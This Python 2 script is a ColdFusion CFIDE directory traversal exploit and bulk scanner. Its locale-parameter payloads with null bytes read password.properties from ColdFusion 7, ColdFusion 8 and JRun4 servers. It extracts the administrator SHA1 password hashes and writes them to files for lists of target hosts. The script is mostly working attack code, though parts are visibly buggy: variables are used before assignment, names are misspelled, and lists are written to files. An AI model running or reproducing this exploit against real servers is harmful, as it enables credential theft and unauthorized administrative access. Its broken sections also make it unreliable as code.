import urllib2, re
from urlparse import urlparse
from urllib2 import Request, urlopen, URLError, HTTPError

print "[+] CFIDE Directory Traversal Scanner by Shubham Shah"
print "[+] Example URL: 'http://example.com'"
method = raw_input("[+] Enter 1 for default, 2 for jRUN or 3 for list input: ")
if method == "1":
    u = raw_input("[+] URL: ")
    f = urllib2.urlopen(u + "/CFIDE/administrator/enter.cfm").read()
    if '7</strong><br />' in (f):
        print "[+] CFIDE Panel Version 7"
        f1 = urllib2.urlopen(u + "/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX7\lib\password.properties%00en").read()
        if "password=" in f1:
            print "[+] Payload Injected, Exploit Working"
            sha1s = re.findall('([A-F0-9]{40})',f1)
            for sha1 in sha1s:
                print "[+] SHA1 Found: " + sha1
            savetxt = raw_input("[+] Would you like to save the source code of the injected page to a file? Y or N: ")
            if savetxt == "Y":
                        savetxt = raw_input("[+] What would you like to name the txt file? E.G. 'test.txt': ")
                        k = open(savetxt,"w")
                        k.write(re.findall('([A-F0-9]{40})',f1))
                        k.close()
                        print "[+] Operation Completed.", savetxt, "saved."
    elif '/CFIDE/administrator/images/spacer.gif' in (f):
                            print "[+] CFIDE Panel Version 8"
                            f2 = urllib2.urlopen(u + "/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en").read()
                            if "password=" not in f2:
                                print "[+] Exploit patched, or directory changed"
                            elif "password=" in f2:
                                print "[+] Payload Injected, Exploit Working"
                                sha1s = re.findall('([A-F0-9]{40})',f2)
                                for sha1 in sha1s:
                                    print "[+] SHA1 Found: " + sha1
                                savetext1 = raw_input("[+] Would you like to save the source code of the injected page to a file? Y or N: ")
                                if savetxt1 == "Y":
                                    savetxt1 = raw_input("[+] What would you like to name the txt file? E.G. 'test.txt': ")
                                    k = open(savetxt1,"w")
                                    k.write(re.findall('([A-F0-9]{40})',f2))
                                    k.close()
                                    print "[+] Operation Completed.", savetxt1, "saved."
elif method == "2":
    u = raw_input("URL: ")
    f = urllib2.urlopen(u + "/CFIDE/administrator/enter.cfm").read()
    if "password=" not in f:
        print "[+] Unexploitable, You are safe!"
    elif "password=" not in f2:
        print "[+] Unexploitable, You are safe!"
    elif '7</strong><br />' in (f):
        print "[+] CFIDE Panel Version 7"
        f1 = urllib2.urlopen(u + "/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties%00en").read()
        if "password=" in f1:
            print "[+] Payload Injected, Exploit Working"
            savetxt = raw_input("[+] Would you like to save this file? Y or N: ")
            if savetxt == "Y":
                        savetxt = raw_input("[+] Would you like to save the source code of the injected page to a file? Y or N: ")
                        k = open(savetxt,"w")
                        k.write(re.findall('([A-F0-9]{40})',f1))
                        k.close()
                        print "[+] Operation Completed.", savetxt, "saved."
    elif '/CFIDE/administrator/images/spacer.gif' in (f):
                            print "[+] CFIDE Panel Version 8"
                            f2 = urllib2.urlopen(u + "/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties%00en").read()
                            if "password=" in f2:
                                print "[+] Payload Injected, Exploit Working"
                                savetxt1 = raw_input("[+] Would you like to save this file? Y or N: ")
                                if savetxt1 == "Y":
                                    savetxt1 = raw_input("[+] Would you like to save the source code of the injected page to a file? Y or N: ")
                                    k = open(savetxt1,"w")
                                    k.write(re.findall('([A-F0-9]{40})',f2))
                                    k.close()
                                    print "[+] Operation Completed.", savetxt1, "saved."
elif method == "3":
    open1 = raw_input("[+] Open TXT file containing a list of URLs E.G. 'urls.txt': ")
text_file = open(open1, "r")
fail_count = 1
lines = [l.strip() for l in open(open1).readlines()]
[l.strip() for l in open(open1).readlines()]
for line in lines:
    var1 = str(i.netloc)
    i = urlparse(line)
    try:
        f1 = urllib2.urlopen("http://" + i.netloc + "/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX7\lib\password.properties%00en").read()
        print i.netloc
        sha1s = re.findall('([A-F0-9]{40})',f1)
        for sha1 in sha1s:
            k = open(str(var1) + ".txt","w")
            k.write(str(sha1s))
            k.write("     " + line)
            k.close()
    except HTTPError, e:
            print 'The server couldn\'t fulfill the request.'
            print 'Error code: ', e.code
    except URLError, e:
            print 'We failed to reach a server.'
            print 'Reason: ', e.reason
    try:
        f2 = urllib2.urlopen("http://" + i.netloc + "/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en").read()
        sha2s = re.findall('([A-F0-9]{40})',f2)
        for sha2 in sha2s:
            k = open(str(var1) + ".txt","w")
            k.write(str(sha2s))
            k.write("     " + line)
            k.close()
    except HTTPError, e:
            print 'The server couldn\'t fulfill the request.'
            print 'Error code: ', e.code
    except URLError, e:
            print 'We failed to reach a server.'
            print 'Reason: ', e.reason
    try:
      f3 = urllib2.urlopen("http://" + i.netloc + "/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties%00en").read()
      sha3s = re.findall('([A-F0-9]{40})',f3)
      for sha3 in sha3s:
          k = open(str(var1) + ".txt","w")
          k.write(str(sha3s))
          k.write("     " + line)
          k.close()
    except HTTPError, e:
            print 'The server couldn\'t fulfill the request.'
            print 'Error code: ', e.code
    except URLError, e:
            print 'We failed to reach a server.'
            print 'Reason: ', e.reason
